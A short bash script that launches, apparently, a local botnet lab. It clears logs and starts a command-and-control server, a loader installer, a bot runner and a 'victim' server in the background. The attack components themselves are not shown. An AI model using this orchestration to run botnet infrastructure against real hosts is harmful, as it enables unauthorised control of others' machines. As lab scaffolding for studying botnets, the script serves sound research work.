#!/bin/bash


# echo "Initializing the Database"
# ./init.sh
# echo "Database Initialized"

echo "setting up config"
sleep 3


echo "cleaning the previous LOGs"
echo "" > ./logs/server.log
echo "" > ./logs/loader.log
echo "" > ./logs/run.log
echo "" > ./logs/victim.log
echo ""
echo "Logs are cleaned"
echo ""

echo "Starting the CNC server"
echo ""
nohup python ./botnet/server.py &
echo "The CNC Server is up and running"
echo "Find the logs in <project root>/logs/server.log"
echo ""
echo "The PiD for the server Process"
lsof -i:5000
echo ""
echo "sleeping for 3 seconds"
sleep 5


echo "Starting the loader"
nohup python ./loader/install/installer.py &
echo "Loader booted"
echo "Find the logs in <project root>/logs/loader.log"
echo "sleeping for 3 seconds"
sleep 5

echo "staring the run.sh process"
nohup ./botnet/botrun.sh > ./logs/run.log 2>&1 &
echo "Find the logs in <project root>/logs/run.log"


echo "Starting the victim server"
echo ""
nohup python3 ./victim/victim.py > ./logs/victim.log 2>&1 &
echo "The victim Server is up and running"
echo "Find the logs in <project root>/logs/victim.log"
echo ""
echo "The PiD for the server Process"
lsof -i:10000
echo ""

sleep 10

sh ./log.sh 10


